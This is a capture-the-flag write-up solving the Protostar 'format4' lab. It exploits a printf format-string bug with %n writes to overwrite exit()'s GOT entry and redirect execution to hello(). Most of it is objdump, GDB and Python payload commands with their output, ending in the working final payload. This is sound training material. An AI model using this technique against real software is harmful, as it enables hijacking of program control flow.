In this one we need to hijack execution flow and redirect it to function hello()

This is done using Global Offset Table.

First, search for address we will write to. This is going to be exit() function in relocation records.

user@protostar:/opt/protostar/bin$ objdump -R ./format4

./format4:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit 		<-------  we'll use this address to write to



Next, find address of hello() function. We will write address of hello() to exit() in dynamic relocation section.

user@protostar:/opt/protostar/bin$ objdump -d format4 | grep hello
080484b4 <hello>:



So, the task it to write 0x080484b4 value to memory 0x08049724.


From now, task is very similar to the previous one.


Finding offset to write address (it'll be 4):

user@protostar:/opt/protostar/bin$ python -c "print 'AAAA.' + '%08x.'*5" | ./format4
AAAA.00000200.b7fd8420.bffff604.41414141.252e7825.


Set address we'll be writing to:

user@protostar:/opt/protostar/bin$ python -c "print '\x24\x97\x04\x08' + '%08x.'*3 + '%x'" | ./format4
$00000200.b7fd8420.bffff604.8049724


Using Direct Parameter Access to make solution shorter. We'll write 4 bytes separately and use random numbers (50, 1, 1, 1) to start with:

user@protostar:/opt/protostar/bin$ python -c "print '\x24\x97\x04\x08' + '\x25\x97\x04\x08' + '\x26\x97\x04\x08' '\x27\x97\x04\x08' + '%50u%4\$n' + '%1u%5\$n' + '%1u%6\$n' + '%1u%7\$n'" > /tmp/f4



Redirect payload to file, so it could be sent as input from GDB.

In GDB, set breakpoint after printf() fuction.

(gdb) disass vuln
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:	push   ebp
0x080484d3 <vuln+1>:	mov    ebp,esp
0x080484d5 <vuln+3>:	sub    esp,0x218
0x080484db <vuln+9>:	mov    eax,ds:0x8049730
0x080484e0 <vuln+14>:	mov    DWORD PTR [esp+0x8],eax
0x080484e4 <vuln+18>:	mov    DWORD PTR [esp+0x4],0x200
0x080484ec <vuln+26>:	lea    eax,[ebp-0x208]
0x080484f2 <vuln+32>:	mov    DWORD PTR [esp],eax
0x080484f5 <vuln+35>:	call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:	lea    eax,[ebp-0x208]
0x08048500 <vuln+46>:	mov    DWORD PTR [esp],eax
0x08048503 <vuln+49>:	call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:	mov    DWORD PTR [esp],0x1
0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
End of assembler dump.
(gdb) b *0x08048508
Breakpoint 1 at 0x8048508: file format4/format4.c, line 22.


Run with payload:

(gdb) run < /tmp/f4
Starting program: /opt/protostar/bin/format4 < /tmp/f4
$%&'                                               51230868449603221222836134518564

Breakpoint 1, vuln () at format4/format4.c:22
22	in format4/format4.c
(gdb) x 0x08049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x5f564c42


Looks like we've written 4 bytes of our choice to correct address.

All that's left to do is just to calculate and set correct offsets to write 0x080484b4.

Final solution is:


user@protostar:/opt/protostar/bin$ python -c "print '\x24\x97\x04\x08' + '\x25\x97\x04\x08' + '\x26\x97\x04\x08' '\x27\x97\x04\x08' + '%164u%4\$n' + '%208u%5\$n' + '%128u%6\$n' + '%260u%7\$n'" | ./format4
$%&'                                                                                                                                                                 512                                                                                                                                                                                                      3086844960                                                                                                                      3221222916                                                                                                                                                                                                                                                           134518564
code execution redirected! you win